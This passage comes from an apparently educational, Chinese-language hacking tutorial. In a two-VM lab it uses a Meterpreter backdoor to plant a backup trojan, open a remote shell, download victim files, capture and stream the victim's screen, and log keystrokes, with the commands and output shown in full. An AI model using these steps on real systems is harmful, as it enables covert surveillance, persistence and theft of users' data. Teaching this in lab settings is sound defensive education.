
```
meterpreter > cd  ../Documents
meterpreter > ls
Listing: C:\Users\IEUser\Documents
==================================
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2019-03-19 06:49:34 -0400  My Music
40777/rwxrwxrwx   0     dir   2019-03-19 06:49:34 -0400  My Pictures
40777/rwxrwxrwx   0     dir   2019-03-19 06:49:34 -0400  My Videos
40777/rwxrwxrwx   0     dir   2019-03-19 07:29:40 -0400  WindowsPowerShell
100666/rw-rw-rw-  402   fil   2019-03-19 06:49:49 -0400  desktop.ini
```

你会看到音乐、图片、视频等文件夹，就像任何其他 Windows 电脑一样。攻击者可以使用这些命令浏览目标计算机并寻找有趣的文件进行窃取。

## 浏览和上传文件
2. 从你的 Kali VM 上传 `Fortnite_cheat_mode.exe` 恶意软件文件的副本到 `Documents` 文件夹：
```
meterpreter > upload /home/kali/Desktop/Fortnite_cheat_mode.exe 
[*] uploading  : /home/kali/Desktop/Fortnite_cheat_mode.exe -> Fortnite_cheat_mode.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/Desktop/Fortnite_cheat_mode.exe -> Fortnite_cheat_mode.exe
[*] uploaded   : /home/kali/Desktop/Fortnite_cheat_mode.exe -> Fortnite_cheat_mode.exe
```
3. 切换回你的 Windows 10 VM 并打开你的 `Documents` 文件夹。你应该能看到新上传的特洛伊木马文件，如 [图 6-6](#c06.xhtml#figure6-6) 所示。

![图 6-6：我们可以从 Kali 向被感染的 Windows 10 VM 上传文件。](image_fi/502000c06/f06006.png)
图 6-6：我们可以从 Kali 向被感染的 Windows 10 VM 上传文件。

现在你在 Windows VM 上有了特洛伊木马的备份，如果 Windows Defender 重新启动并删除 `Downloads` 文件夹中的特洛伊木马，你始终可以从 `Documents` 复制并粘贴到 `Downloads`。一旦有人通过网络或电子邮件打开单个感染文件，攻击者通常会在计算机的不同位置上传多个病毒，以确保他们能够保持对目标机器的控制。

## 从受害者计算机下载文件
Meterpreter 中的 `download` 命令允许你从受害者计算机下载文件。为了尝试一下，我们将在 Windows VM 上创建一个示例文本文件，然后窃取它。
1. 在 `meterpreter >` 提示符下输入此命令，以远程控制受害者计算机的 Windows 命令行终端，即 `shell`。
```
meterpreter > shell
Process 4952 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.379]
(c) 2018 Microsoft Corporation. All rights reserved.
```
2. 现在创建一个名为 `hacked.txt` 的文件，其中包含文本“你已被入侵！”
```
C:\Users\IEUser\Documents> echo "You've been hacked!" > hacked.txt
echo "You've been hacked!" > hacked.txt
```
3. 检查 Windows VM 上的 `Documents` 文件夹。你应该能看到我们刚刚从 Kali 远程创建的 `hacked.txt` 文件。
4. 回到 Kali，退出 Windows `shell` 并返回到 Meterpreter：
```
C:\Users\IEUser\Documents> exit
exit
```
5. 现在将文件从 Windows 下载到你的 Kali VM：
```
meterpreter > download hacked.txt
[*] Downloading: hacked.txt -> hacked.txt
[*] Downloaded 24.00 B of 24.00 B (100.0%): hacked.txt -> hacked.txt
[*] download   : hacked.txt -> hacked.txt
```
6. 最后，使用以下命令查看文件的内容，即我们的“你已被入侵！”消息。
```
meterpreter > cat hacked.txt
"You've been hacked!"
```
我们已成功从受害者计算机下载文件！在这种情况下，它是我们从攻击 VM（远程）创建的文件，但真正的攻击者可以下载更重要信息。当 Windows 用户运行 Meterpreter 特洛伊木马时，Windows 用户有权访问的任何文件都可被攻击者下载：客户名单、家庭照片、预算电子表格、税表、银行对账单、员工数据、医疗记录、宝贵的知识产权，或敏感文件 *任何* 类型的敏感文件，都可以用几下按键窃取。

## 查看受害者计算机的屏幕
类似于 Meterpreter shell 的特洛伊木马通常被称为 *backdoors*，因为它们以绕过你所有其他安全措施（包括登录）的方式让攻击者访问你的计算机。就像偷偷从电影院的后门溜进去一样。当你在 Windows VM 上点击 Meterpreter 特洛伊木马文件时，你打开了进入计算机的秘密通道，允许我们上传和下载文件。但情况更糟：你已给我们的攻击 VM 一个后门来查看你的计算机屏幕、记录你的击键，甚至打开你的网络摄像头！为了证明这一点，我们将尝试从 Kali 内查看 Windows VM 的屏幕。
1. 在 Meterpreter shell 中输入 `screenshot -v true`。使用此命令，攻击者可以查明受害机器用户正在看到什么。
```
meterpreter > screenshot -v true
Screenshot saved to: /home/kali/Desktop/kYpTvFbl.jpeg 
```
2. 应该会弹出一个窗口，显示 Windows VM 的屏幕截图，如 [图 6-7](#c06.xhtml#figure6-7) 所示。
![图 6-7：从 Windows VM 捕获屏幕截图](image_fi/502000c06/f06007.png)
图 6-7：从 Windows VM 捕获屏幕截图
3. 你甚至可以更进一步，实时监视用户的计算机屏幕。在 Meterpreter 中，输入 `screenshare` 命令：
```
meterpreter > screenshare
[*] Preparing player...
[*] Opening player at:  /home/kali/oDgBGMiY.html
[*] Streaming...
```
此命令并不总是有效，并且可能会使你的两个 VM（以及你的主机计算机）变得极其缓慢，因为它尝试通过虚拟网络将 Windows 10 VM 的计算机屏幕实时视频流传输到 Kali VM。但如果它确实有效，你将通过 Kali 中的浏览器窗口看到 Windows 10 VM 的桌面，如 [图 6-8](#c06.xhtml#figure6-8) 所示。
4. 切换到你的 Windows VM，移动一些文件或窗口，清空回收站，或打开网页。如果你有多个显示器或足够空间同时显示两个 VM，你可以通过 Kali 中浏览器里的流媒体视频观看你在 Windows VM 中所做的一切。够 creepy 的，对吧？
5. 点击回到 Kali 中的 Meterpreter 终端窗口并按 `CTRL-C` 停止屏幕共享。
![图 6-8：`screenshare` 命令让 Kali 上的攻击者通过互联网监视你的 Windows 桌面。](image_fi/502000c06/f06008.png)
图 6-8：`screenshare` 命令让 Kali 上的攻击者通过互联网监视你的 Windows 桌面。

## 记录击键
一旦控制了机器，攻击者可以记录用户的每一个击键。这为攻击者提供了用户正在输入内容的记录，包括搜索、命令、密码等。让我们看看它是如何工作的。
1. 在 Meterpreter shell 中输入 `keyscan_start` 以开始记录目标计算机的击键：
```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```
2. 切换回你的 Windows VM，在搜索栏中输入 `notepad` 并打开记事本应用。
3. 在记事本中输入以下信息：
```
My credit card number is not 1111 1111 1111 1111with an expiration of 11/2028and a cvv of 111
```
当然，你绝不应该以明文形式将此类敏感信息存储在计算机上，但世界上许多人确实这样做。
4. 切换回 Kali VM 并输入 `keyscan_dump` 以查看记录的击键：
```
meterpreter > keyscan_dump
Dumping captured keystrokes...
notepad<CR>
<Shift>My credit card number is not 1111 1111 1111 1111<CR>
with an expiration of 11/2028<CR>
and a cvv of 111<CR>
```
